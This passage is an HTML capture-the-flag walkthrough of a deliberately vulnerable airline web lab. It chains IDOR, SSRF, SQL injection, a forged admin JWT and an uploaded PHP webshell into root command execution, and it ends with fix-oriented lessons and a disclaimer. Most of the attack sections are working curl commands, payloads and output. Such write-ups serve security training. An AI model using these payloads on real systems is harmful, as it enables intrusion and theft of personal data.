+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Booking</th>
+<th>Belongs to</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td>Alice Mercer</td>
+<td>Name, email, passport <code>UK789456</code> leaked + flag</td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td>Bob Osei</td>
+<td>Name, email, passport <code>GHA98765</code> leaked + flag</td>
+</tr>
+<tr class="odd">
+<td>3</td>
+<td>Charlie Mensah</td>
+<td>Name, email, passport <code>US123789</code> leaked + flag</td>
+</tr>
+<tr class="even">
+<td>4</td>
+<td>Me (Kofi)</td>
+<td>My own data — <code>hive_flag: null</code></td>
+</tr>
+<tr class="odd">
+<td>5</td>
+<td>(no booking)</td>
+<td>All nulls</td>
+</tr>
+</tbody>
+</table>
+<p>🚩 <code>FLAG{1d0r_b00k1ng_p4ss3ng3r_d4t4_l34k3d}</code></p>
+<p><img src="screenshots/07-v3-idor-passenger-data.png" alt="V3 IDOR" />
+<em>Three other passengers' full PII (names, emails, passport numbers,
+UUIDs) exposed by incrementing an integer.</em></p>
+<p>The server-side code actually <em>detects</em> the IDOR (it sets the
+flag specifically when <code>req.user.userId !== booking.user_id</code>)
+but still serves the data. Detection without prevention.</p>
+<hr />
+<h2 id="phase-6--v6-broken-access-control">Phase 6 — V6: Broken access
+control</h2>
+<p><code>/api/security/flags</code> uses <code>requireAuth</code>
+instead of <code>requireRole('security','admin')</code>. Any logged-in
+passenger can read the airline's internal security watchlist.</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-s</span> <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer </span><span class="va">$TOKEN</span><span class="st">&quot;</span> <span class="va">$BASE</span>/api/security/flags <span class="kw">|</span> <span class="ex">jq</span></span></code></pre></div>
+<p>Returns Charlie Mensah's "Passport document mismatch" flag — internal
+screening notes that should never reach a passenger. Includes severity
+level (<code>medium</code>), the flagging officer's ID, timestamp, and
+the flagged passenger's passport number.</p>
+<p>🚩 <code>FLAG{br0k3n_4cc3ss_c0ntr0l_s3cur1ty_d4t4}</code></p>
+<p><img src="screenshots/14-v6-broken-access-control.png"
+alt="V6 broken access control" /> <em>Passenger token reading the
+security team's flagged-passenger watchlist.</em></p>
+<p>The <code>POST /api/security/flag</code> endpoint (write) is
+correctly protected with <code>requireRole</code>. Only the read
+endpoint was forgotten — classic copy-paste mistake.</p>
+<hr />
+<h2 id="phase-7--v8-ssrf">Phase 7 — V8: SSRF</h2>
+<p><code>POST /api/flights/status-check</code> fetches any user-supplied
+URL server-side with no validation.</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-s</span> <span class="at">-X</span> POST <span class="va">$BASE</span>/api/flights/status-check <span class="dt">\</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer </span><span class="va">$TOKEN</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Content-Type: application/json&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-d</span> <span class="st">&#39;{&quot;url&quot;:&quot;http://localhost:3000/api/internal/config&quot;}&#39;</span></span></code></pre></div>
+<p>Port 3000 is the container's internal port — invisible from my host
+machine but the server's loopback. The response body contains:</p>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;version&quot;</span><span class="fu">:</span> <span class="st">&quot;2.1.0&quot;</span><span class="fu">,</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;jwt_secret&quot;</span><span class="fu">:</span> <span class="st">&quot;hiveair&quot;</span><span class="fu">,</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;admin_email&quot;</span><span class="fu">:</span> <span class="st">&quot;admin@hiveconsult.com&quot;</span><span class="fu">,</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;ssrf_flag&quot;</span><span class="fu">:</span> <span class="st">&quot;FLAG{ssrf_1nt3rn4l_c0nf1g_3xp0s3d}&quot;</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p>🚩 <code>FLAG{ssrf_1nt3rn4l_c0nf1g_3xp0s3d}</code></p>
+<p><img src="screenshots/15-v8-ssrf-and-v9-business-logic.png"
+alt="V8 SSRF" /> <em>SSRF pivoting through the server's network identity
+to reach an internal-only endpoint.</em></p>
+<p>Bonus probe: trying <code>/api/internal/bruteforce-flag</code>
+through the SSRF returned <code>401 Authentication required</code>. The
+server-side fetch doesn't forward the original request's
+<code>Authorization</code> header. Useful boundary to know.</p>
+<p>In production: this would be the gateway to AWS metadata
+(<code>169.254.169.254</code>), internal databases, or service-mesh
+endpoints. Capital One 2019 was this exact bug class.</p>
+<hr />
+<h2 id="phase-8--v9-business-logic-flaw">Phase 8 — V9: Business logic
+flaw</h2>
+<p>Two design flaws in <code>POST /api/bookings</code>:</p>
+<ol type="1">
+<li>No check on <code>flight.status</code> — departed flights are
+bookable.</li>
+<li>Client-supplied <code>price</code> is trusted.</li>
+</ol>
+<p>Flight <code>AF404</code> (id 4) has status <code>departed</code> and
+price $760.</p>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-s</span> <span class="at">-X</span> POST <span class="va">$BASE</span>/api/bookings <span class="dt">\</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer </span><span class="va">$TOKEN</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Content-Type: application/json&#39;</span> <span class="dt">\</span></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-d</span> <span class="st">&#39;{&quot;flight_id&quot;:4,&quot;seat&quot;:&quot;99X&quot;,&quot;class&quot;:&quot;first&quot;,&quot;price&quot;:0}&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;success&quot;</span><span class="fu">:</span> <span class="kw">true</span><span class="fu">,</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;booking&quot;</span><span class="fu">:</span> <span class="fu">{</span> <span class="dt">&quot;pnr&quot;</span><span class="fu">:</span> <span class="st">&quot;HIVE6NCWLT&quot;</span><span class="fu">,</span> <span class="dt">&quot;flight_number&quot;</span><span class="fu">:</span> <span class="st">&quot;AF404&quot;</span><span class="fu">,</span> <span class="dt">&quot;class&quot;</span><span class="fu">:</span> <span class="st">&quot;first&quot;</span><span class="fu">,</span> <span class="dt">&quot;price&quot;</span><span class="fu">:</span> <span class="dv">760</span> <span class="fu">},</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;hive_flag&quot;</span><span class="fu">:</span> <span class="st">&quot;FLAG{bus1n3ss_l0g1c_byp4ss_fl1ght_b00k3d}&quot;</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p>🚩 <code>FLAG{bus1n3ss_l0g1c_byp4ss_fl1ght_b00k3d}</code></p>
+<p><img src="screenshots/15-v8-ssrf-and-v9-business-logic.png"
+alt="V9 business logic" /> <em>Booking a flight that left yesterday, in
+first class.</em></p>
+<p>Subtle: I sent <code>price: 0</code> but the server stored
+<code>price: 760</code>. The relevant code is
+<code>const finalPrice = parseFloat(price) || flight.price;</code> — in
+JavaScript, <code>0 || x</code> evaluates to <code>x</code> because
+<code>0</code> is falsy. A real attacker would send
+<code>price: 0.01</code> to actually exploit the pricing bug. The
+departed-flight check fired the flag either way.</p>
+<p>The fix is one character: <code>??</code> instead of
+<code>||</code>.</p>
+<hr />
+<h2 id="phase-9--v5-jwt-forgery">Phase 9 — V5: JWT forgery</h2>
+<p>With <code>JWT_SECRET=hiveair</code> known, I can mint any token.</p>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Pull admin&#39;s UUID via SQLi</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="va">ADMIN_UUID</span><span class="op">=</span><span class="va">$(</span><span class="ex">curl</span> <span class="at">-sG</span> <span class="st">&quot;</span><span class="va">$BASE</span><span class="st">/api/flights/search&quot;</span> <span class="dt">\</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-urlencode</span> <span class="st">&quot;q=x&#39; UNION SELECT id,uuid,email,name,role,1,1,1,1,1,1,1,1 FROM users WHERE id=1--&quot;</span> <span class="dt">\</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">|</span> <span class="ex">jq</span> <span class="at">-r</span> <span class="st">&#39;.flights[0].flight_number&#39;</span><span class="va">)</span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Forge the token</span></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="va">ADMIN_TOKEN</span><span class="op">=</span><span class="va">$(</span><span class="ex">node</span> <span class="at">-e</span> <span class="st">&quot;</span></span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a><span class="st">const jwt = require(&#39;jsonwebtoken&#39;);</span></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a><span class="st">console.log(jwt.sign({</span></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a><span class="st">  userId: 1,</span></span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a><span class="st">  uuid: &#39;</span><span class="va">$ADMIN_UUID</span><span class="st">&#39;,</span></span>
+<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a><span class="st">  email: &#39;admin@hiveconsult.com&#39;,</span></span>
+<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a><span class="st">  name: &#39;HIVE Admin&#39;,</span></span>
+<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a><span class="st">  role: &#39;admin&#39;</span></span>
+<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a><span class="st">}, &#39;hiveair&#39;, { expiresIn: &#39;24h&#39; }));</span></span>
+<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;</span><span class="va">)</span></span></code></pre></div>
+<p>Decoded payload of the forged token:</p>
+<div class="sourceCode" id="cb25"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span><span class="dt">&quot;userId&quot;</span><span class="fu">:</span><span class="dv">1</span><span class="fu">,</span><span class="dt">&quot;uuid&quot;</span><span class="fu">:</span><span class="st">&quot;83115dab-...&quot;</span><span class="fu">,</span><span class="dt">&quot;email&quot;</span><span class="fu">:</span><span class="st">&quot;admin@hiveconsult.com&quot;</span><span class="fu">,</span><span class="dt">&quot;role&quot;</span><span class="fu">:</span><span class="st">&quot;admin&quot;</span><span class="fu">}</span></span></code></pre></div>
+<p>Use it:</p>
+<div class="sourceCode" id="cb26"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-s</span> <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer </span><span class="va">$ADMIN_TOKEN</span><span class="st">&quot;</span> <span class="va">$BASE</span>/api/admin/stats</span></code></pre></div>
+<div class="sourceCode" id="cb27"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;users&quot;</span><span class="fu">:</span> <span class="dv">9</span><span class="fu">,</span> <span class="dt">&quot;bookings&quot;</span><span class="fu">:</span> <span class="dv">5</span><span class="fu">,</span> <span class="dt">&quot;flights&quot;</span><span class="fu">:</span> <span class="dv">8</span><span class="fu">,</span> <span class="dt">&quot;revenue&quot;</span><span class="fu">:</span> <span class="st">&quot;4540.00&quot;</span><span class="fu">,</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;hive_flag&quot;</span><span class="fu">:</span> <span class="st">&quot;FLAG{jwt_f0rg3d_w34k_s3cr3t_4dm1n_pwn3d}&quot;</span><span class="fu">,</span></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;note&quot;</span><span class="fu">:</span> <span class="st">&quot;JWT secret </span><span class="ch">\&quot;</span><span class="st">hiveair</span><span class="ch">\&quot;</span><span class="st"> was weak enough to forge.&quot;</span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p>🚩 <code>FLAG{jwt_f0rg3d_w34k_s3cr3t_4dm1n_pwn3d}</code></p>
+<p><img src="screenshots/08-v5-jwt-forge.png" alt="V5 JWT forge" />
+<em>Forged token decoded next to the admin stats response — server
+accepts the impersonation.</em></p>
+<p>Confirming the server's view of me:</p>
+<div class="sourceCode" id="cb28"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-s</span> <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer </span><span class="va">$ADMIN_TOKEN</span><span class="st">&quot;</span> <span class="va">$BASE</span>/api/auth/me <span class="kw">|</span> <span class="ex">jq</span> .user</span></code></pre></div>
+<div class="sourceCode" id="cb29"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;id&quot;</span><span class="fu">:</span> <span class="dv">1</span><span class="fu">,</span> <span class="dt">&quot;email&quot;</span><span class="fu">:</span> <span class="st">&quot;admin@hiveconsult.com&quot;</span><span class="fu">,</span> <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="st">&quot;HIVE Admin&quot;</span><span class="fu">,</span></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;role&quot;</span><span class="fu">:</span> <span class="st">&quot;admin&quot;</span><span class="fu">,</span> <span class="dt">&quot;passport&quot;</span><span class="fu">:</span> <span class="st">&quot;ADMIN001&quot;</span></span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p>I never sent a password. The server pulled the real admin record from
+the database because my forged token claimed <code>userId: 1</code>.</p>
+<p><img src="screenshots/10-admin-confirmation-auth-me.png"
+alt="Server confirms my forged identity" />
+<em><code>/api/auth/me</code> returns HIVE Admin's full record. The
+server resolved my forged <code>userId: 1</code> claim against the real
+database row — confirming the impersonation is complete.</em></p>
+<p><img src="screenshots/09-admin-dashboard.png"
+alt="Admin dashboard access" /> <em>Full admin panel: user management,
+bookings, flights, revenue — all accessible via the forged
+token.</em></p>
+<p><img src="screenshots/16-admin-dashboard-with-flag.png"
+alt="Admin dashboard with V5 flag" /> <em>The Airport Control Dashboard
+displays the V5 flag directly in the UI when accessed with the forged
+JWT. The page renders identically whether the visitor logged in with the
+leaked password or minted a token offline. The server has no way to
+distinguish them.</em></p>
+<hr />
+<h2 id="phase-10--v7--v10-file-upload-to-rce">Phase 10 — V7 + V10: File
+upload to RCE</h2>
+<p>Two layered bugs:</p>
+<ol type="1">
+<li><strong>V7:</strong> <code>multer</code> validates only the
+<code>Content-Type</code> header on uploads. The actual file extension
+and contents are not checked.</li>
+<li><strong>V10 (chain enabler):</strong> The static
+<code>/uploads/:filename</code> route executes any <code>.php</code>
+file via <code>execSync('php ${file}')</code>.</li>
+</ol>
+<h3 id="step-1--write-the-webshell">Step 1 — Write the webshell</h3>
+<div class="sourceCode" id="cb30"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="st">&quot;=== WEBSHELL ACTIVE ===</span><span class="sc">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="fu">system</span>(<span class="va">$_GET</span>[<span class="st">&#39;c&#39;</span>])<span class="ot">;</span></span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<p><img src="screenshots/11-webshell-upload-attempt.png"
+alt="Webshell prepared" /> <em>Webshell crafted. First upload attempt
+failed with <code>Authentication required</code> — a reminder that bash
+variables vanish across shell sessions. After re-establishing
+<code>$ADMIN_TOKEN</code>, the upload succeeded.</em></p>
+<h3 id="step-2--upload-as-imagejpeg">Step 2 — Upload as
+<code>image/jpeg</code></h3>
+<div class="sourceCode" id="cb31"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-s</span> <span class="at">-X</span> POST <span class="va">$BASE</span>/api/upload/document <span class="dt">\</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer </span><span class="va">$ADMIN_TOKEN</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-F</span> <span class="st">&quot;document=@shell.php;type=image/jpeg&quot;</span> <span class="dt">\</span></span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-F</span> <span class="st">&quot;doc_type=passport&quot;</span></span></code></pre></div>
+<div class="sourceCode" id="cb32"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span> <span class="dt">&quot;success&quot;</span><span class="fu">:</span> <span class="kw">true</span><span class="fu">,</span> <span class="dt">&quot;url&quot;</span><span class="fu">:</span> <span class="st">&quot;/uploads/1779324540902_shell.php&quot;</span> <span class="fu">}</span></span></code></pre></div>
+<p>The MIME type is what curl announces. The actual file is PHP source.
+The server believes the header.</p>
+<h3 id="step-3--execute-commands">Step 3 — Execute commands</h3>
+<div class="sourceCode" id="cb33"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&quot;</span><span class="va">$BASE</span><span class="st">/uploads/1779324540902_shell.php?c=whoami&quot;</span></span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="co"># root</span></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&quot;</span><span class="va">$BASE</span><span class="st">/uploads/1779324540902_shell.php?c=id&quot;</span></span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a><span class="co"># uid=0(root) gid=0(root)</span></span>
+<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&quot;</span><span class="va">$BASE</span><span class="st">/uploads/1779324540902_shell.php?c=cat%20/app/server.js&quot;</span> <span class="kw">|</span> <span class="fu">head</span> <span class="at">-50</span></span>
+<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a><span class="co"># (full app source code)</span></span></code></pre></div>
+<p><img src="screenshots/12-v10-chain-rce.png" alt="V7 + V10 RCE" />
+<em>Webshell active. whoami → root. Full filesystem access. Server
+source readable.</em></p>
+<h3 id="step-4--claim-the-chain-flag">Step 4 — Claim the chain flag</h3>
+<div class="sourceCode" id="cb34"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-s</span> <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer </span><span class="va">$ADMIN_TOKEN</span><span class="st">&quot;</span> <span class="va">$BASE</span>/api/internal/chain-flag</span></code></pre></div>
+<div class="sourceCode" id="cb35"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;hive_flag&quot;</span><span class="fu">:</span> <span class="st">&quot;FLAG{ch41n3d_1d0r_jwt_rce_4irp0rt_0wn3d}&quot;</span><span class="fu">,</span></span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;note&quot;</span><span class="fu">:</span> <span class="st">&quot;Full chain complete: IDOR → passenger UUID exposed → JWT forged → Admin access → Webshell uploaded → RCE&quot;</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p>🚩 <code>FLAG{ch41n3d_1d0r_jwt_rce_4irp0rt_0wn3d}</code></p>
+<hr />
+<h2 id="flags-captured">Flags captured</h2>
+<table>
+<thead>
+<tr class="header">
+<th>#</th>
+<th>Vulnerability</th>
+<th>Flag</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td>V1 — No rate limiting</td>
+<td><code>FLAG{n0_r4t3_l1m1t_br3ach3d_br4v0}</code></td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td>V3 — IDOR</td>
+<td><code>FLAG{1d0r_b00k1ng_p4ss3ng3r_d4t4_l34k3d}</code></td>
+</tr>
+<tr class="odd">
+<td>3</td>
+<td>V6 — Broken access control</td>
+<td><code>FLAG{br0k3n_4cc3ss_c0ntr0l_s3cur1ty_d4t4}</code></td>
+</tr>
+<tr class="even">
+<td>4</td>
+<td>V8 — SSRF</td>
+<td><code>FLAG{ssrf_1nt3rn4l_c0nf1g_3xp0s3d}</code></td>
+</tr>
+<tr class="odd">
+<td>5</td>
+<td>V9 — Business logic</td>
+<td><code>FLAG{bus1n3ss_l0g1c_byp4ss_fl1ght_b00k3d}</code></td>
+</tr>
+<tr class="even">
+<td>6</td>
+<td>V5 — JWT forgery</td>
+<td><code>FLAG{jwt_f0rg3d_w34k_s3cr3t_4dm1n_pwn3d}</code></td>
+</tr>
+<tr class="odd">
+<td>7</td>
+<td>V10 — Chain RCE</td>
+<td><code>FLAG{ch41n3d_1d0r_jwt_rce_4irp0rt_0wn3d}</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="findings-summary">Findings summary</h2>
+<table>
+<thead>
+<tr class="header">
+<th>Vuln</th>
+<th>Class</th>
+<th>Severity</th>
+<th>Auth needed</th>
+<th>Flag?</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>V1</td>
+<td>No rate limiting on login</td>
+<td>High</td>
+<td>None</td>
+<td>✅</td>
+</tr>
+<tr class="even">
+<td>V2</td>
+<td>SQL injection (UNION)</td>
+<td>Critical</td>
+<td>None</td>
+<td>—</td>
+</tr>
+<tr class="odd">
+<td>V3</td>
+<td>IDOR on <code>/api/bookings/:id</code></td>
+<td>High</td>
+<td>Passenger</td>
+<td>✅</td>
+</tr>
+<tr class="even">
+<td>V4</td>
+<td>Stored XSS in feedback</td>
+<td>High</td>
+<td>Passenger</td>
+<td>—</td>
+</tr>
+<tr class="odd">
+<td>V5</td>
+<td>JWT forgery (HS256 + leaked secret)</td>
+<td>Critical</td>
+<td>None</td>
+<td>✅</td>
+</tr>
+<tr class="even">
+<td>V6</td>
+<td>Broken access control on <code>/api/security/flags</code></td>
+<td>High</td>
+<td>Passenger</td>
+<td>✅</td>
+</tr>
+<tr class="odd">
+<td>V7</td>
+<td>Insecure file upload (MIME-only check)</td>
+<td>Critical</td>
+<td>Any</td>
+<td>✅ (chained)</td>
+</tr>
+<tr class="even">
+<td>V8</td>
+<td>SSRF on <code>/api/flights/status-check</code></td>
+<td>High</td>
+<td>Passenger</td>
+<td>✅</td>
+</tr>
+<tr class="odd">
+<td>V9</td>
+<td>Business logic — bookable departed flights, client price</td>
+<td>Medium</td>
+<td>Passenger</td>
+<td>✅</td>
+</tr>
+<tr class="even">
+<td>V10</td>
+<td>Full chain: IDOR → JWT → upload → RCE</td>
+<td>Critical</td>
+<td>(chains above)</td>
+<td>✅</td>
+</tr>
+</tbody>
+</table>
+<p>V2 and V4 went unflagged by the author but are still real findings
+worth raising in a real engagement.</p>
+<hr />
+<h2 id="lessons">Lessons</h2>
+<p>A few things this lab makes obvious:</p>
+<p><strong>The leak is usually the door.</strong>
+<code>robots.txt</code> plus a <code>.env</code> in the public folder
+gave away the kingdom before I touched authentication. Static directory
+listings, backup files, and <code>.env</code> artifacts are still where
+most real engagements start.</p>
+<p><strong>Symmetric JWT + a leaked secret = zero
+authentication.</strong> HS256 is convenient. It's also a single point
+of failure. Any app using <code>HS256</code> should treat the secret
+like a private key — and probably switch to <code>RS256</code> if the
+secret is ever stored anywhere readable.</p>
+<p><strong>Authorization is harder than authentication.</strong> Most
+flags here came from the gap between "you logged in" and "you're allowed
+to do <em>that</em>." IDOR, broken access control, and JWT forgery all
+live in that space. Authentication has matured. Authorization is still
+where developers cut corners.</p>
+<p><strong>MIME type is a client-controlled header.</strong> Never trust
+it for a security decision. Inspect the file bytes. Constrain the saved
+extension. Don't execute uploaded content under any circumstances.</p>
+<p><strong>Stacking small bugs beats single big bugs.</strong> V7 alone
+(upload a PHP file) is medium severity. V5 alone (forge an admin JWT) is
+high. Chain them and you get root on the airport's production system.
+Real attack chains look like this — never one bug, always five small
+ones in sequence.</p>
+<p><strong>Plaintext passwords are still in production in 2026.</strong>
+The SQLi dump returned passwords directly. Even bcrypt would have made
+the dump useless without a long offline crack. The fix is one library
+call.</p>
+<hr />
+<h2 id="credits">Credits</h2>
+<ul>
+<li><strong>Lab author:</strong> <a
+href="https://www.linkedin.com/in/nana-sei-anyemedu/">Nana Sei
+Anyemedu</a> — <a href="https://hiveconsult.com">Hive Consult</a></li>
+<li><strong>Lab series:</strong> HiveAir, Hive University Voting,
+HiveShoplite, HiveInvoicing (4 labs, 9–12 vulns each)</li>
+<li><strong>Walkthrough author:</strong> <a
+href="https://www.linkedin.com/in/abubakar-sadik-yakubu/">Abubakar Sadik
+Yakubu</a> — <a
+href="https://github.com/Shadowhunter22">@Shadowhunter22</a></li>
+</ul>
+<p>If you're learning offensive security and want a Ghana-based,
+well-designed practice lab, reach out to Nana — these are some of the
+most thoughtfully constructed CTFs I've worked through.</p>
+<hr />
+<h2 id="disclaimer">Disclaimer</h2>
+<p>All exploitation in this writeup was performed against a local Docker
+instance of a lab explicitly published by Hive Consult for public
+bug-bounty practice. Do not run any of these techniques against systems
+you don't own or have explicit permission to test.</p>
+</body>
+</html>
